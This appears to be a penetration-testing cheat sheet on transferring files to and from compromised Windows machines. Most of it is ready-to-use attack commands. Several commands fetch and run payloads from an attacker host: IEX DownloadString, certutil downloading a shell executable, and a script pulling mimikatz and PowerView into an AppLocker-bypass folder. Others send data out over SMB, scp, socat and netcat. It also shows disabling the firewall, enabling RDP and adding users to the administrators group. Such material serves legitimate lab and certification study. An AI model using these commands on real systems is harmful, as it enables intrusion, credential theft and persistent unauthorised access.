# Transfer Files

## <mark style="color:red;">Placing files in writeable paths</mark>

{% embed url="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md" %}

The following folders are by default writable by normal users (depends on Windows version - This is from W10 1803)

```bash
C:\Windows\Tasks 
C:\Windows\Temp 
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

## <mark style="color:red;">SMB</mark>

On Kali, extract the tools.zip archive to a directory. Change to this directory and run either of the following to set up an SMB server:

```python
python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
python /usr/share/doc/python-impacket/examples/smbserver.py tools .
```

Support for smb2

```bash
python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support tools $(pwd)
```

To copy files from Kali to Windows:

```shell
copy \\192.168.1.11\tools\file.ext file.ext
```

&#x20;To copy files from Windows to Kali:

```bash
copy file.ext \\192.168.1.11\tools\file.ext
```

Connecting from Windows to Kali SMB

```bash
# Kali - host SMB share
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share]  # setup local share

# Target - connect to share
cmd> net view \\[kali]              # view remote shares
cmd> net use \\[kali]\[share]       # connect to share
cmd> copy \\[kali]\[share]\[src_file] [/path/to/dest_file]  # copy file
```

## <mark style="color:red;">RDP</mark>

Enable RDP Powershell:

```powershell
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
or
reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Connect using xfreerdp:

<pre class="language-bash"><code class="lang-bash">xfreerdp /u:&#x3C;USERNAME> /p:&#x3C;PASSWORD> /v:&#x3C;TARGET_IP>
<strong>proxychains xfreerdp /u:&#x3C;USERNAME> /p:&#x3C;PASSWORD> /v:&#x3C;TARGET_IP>
</strong></code></pre>

If RDP is available (or we can enable it), we can add our low privileged user to the administrators group and then spawn an administrator command prompt via the GUI:

```
> net localgroup administrators <username> /add
```

Enable RDP and add User to:

```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
netsh advfirewall set allprofiles state off
net localgroup "remote desktop users" alice /add
```

## <mark style="color:red;">Powershell .ps1</mark>

This is a simple powershell script to download files:

```powershell
$baseUrl = "http://192.168.119.139/"
$fileNames = @("PowerUP.ps1", "PowerView.ps1", "mimikatz.exe", "winPEASany.exe")
$downloadPath = "C:\Winodws\Tasks"

foreach ($fileName in $fileNames) {
    $url= $baseUrl + $fileName
    $filePath = Join-Path $downloadPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $filePath
    Write-Host "Downloaded $fileName to $filePath"
}
```

## <mark style="color:red;">Powershell</mark>

```powershell
# Download file from remote to local
powershell -c (New-Object Net.WebClient).DownloadFile('http://[host]:[port]/[file]', '[file]')
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"

# Execute remote PS script
PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
```

## <mark style="color:red;">IWR</mark>

From Windows:

```
IWR -Uri http://KALI_IP:PORT -OutFile C:\Path\To\File
```

## <mark style="color:red;">Certutil</mark>

From kali:

```
python3 -m http.server 9999
```

From Windows CMD:

```powershell
certutil -urlcache -split -f http://<kali_ip>:9999/shell_445.exe C:\\Windows\\Tasks\\shell_445.exe
```

## <mark style="color:red;">Bitsadmin</mark>

From Windows cmd:

```
bitsadmin /transfer badthings http://[kali]:[port]/[src_file] [dest_file]
```

## <mark style="color:red;">SSH server</mark>

Let’s download a file to our Kali box using SCP. Start a SSH server if it is not already running

```
systemctl start ssh.socket 
```

```bash
# Download from Kali
scp <username>@<kali_ip>:C:/Windows/Tasks/file.txt . 

# Upload from Target
scp /tmp/linpeas.out kali@<kali_ip>:/home/kali/Offensive/PGs/
```

## <mark style="color:red;">Netcat</mark>

Windows:

```bash
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...
```

Kali:

```bash
kali@kali:~$ locate wget.exe
/usr/share/windows-resources/binaries/wget.exe

kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

The connection is received by Netcat on the Windows machine as shown below:

```powershell
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459
^C
C:\Users\offsec>
```

## <mark style="color:red;">Socat</mark>&#x20;

Alice wants to share a file with Bob:

```bash
kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```

Bob downloads the file from Alice host:

```powershell
C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

## <mark style="color:red;">Servers</mark>

### <mark style="color:blue;">Python2</mark>

```bash
python -m SimpleHTTPServer 7331
```

### <mark style="color:blue;">Python3</mark>

```bash
python3 -m http.server 7331
```

### <mark style="color:blue;">PHP</mark>

```bash
php -S 0.0.0.0:8000
```

### <mark style="color:blue;">Ruby</mark>

```bash
ruby -run -e httpd . -p 9000
```

### <mark style="color:blue;">Busybox</mark>

```bash
busybox httpd -f -p 10000
```
